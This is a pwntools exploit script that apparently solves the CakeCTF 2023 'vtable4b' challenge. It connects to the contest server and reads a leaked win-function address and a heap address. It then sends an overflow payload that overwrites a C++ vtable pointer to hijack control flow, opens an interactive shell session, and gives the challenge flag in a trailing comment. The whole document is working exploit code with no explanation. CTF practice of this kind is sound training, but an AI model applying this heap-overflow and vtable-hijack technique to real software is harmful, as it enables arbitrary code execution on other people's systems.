from pwn import * 


p = remote("vtable4b.2023.cakectf.com",9000)

win_function_leak= p.recvuntil(b'Display heap').split(b"\n1. Use cowsay")[0].split(b"<win>")[1].strip().split(b'= ')[1]

win_funct = p64(int(win_function_leak,16))

setup_exp = p64(0x4141414141414141)
setup_exp+=p64(0x4141414141414141)
setup_exp+=p64(0x4141414141414141)
setup_exp+=p32(0x21)

p.sendline(b'2')
p.sendline(setup_exp)

p.sendline(b'3')
print(p.recvuntil(b'heap'))
print(p.recvuntil(b'heap'))

heap_adress = int(p.recvuntil(b'heap').split(b'4141414141414141')[0].split(b'\n')[-1].split(b' | ')[0],16)
heap_adress_p64=  p64(heap_adress)


setup_exp =win_funct
setup_exp+=p64(0x4141414141414141)
setup_exp+=p64(0x4141414141414141)
setup_exp+=p64(0x21)
setup_exp+=heap_adress_p64

p.sendline(b'2')
p.sendline(setup_exp)



p.interactive()

# CakeCTF{vt4bl3_1s_ju5t_4n_arr4y_0f_funct1on_p0int3rs}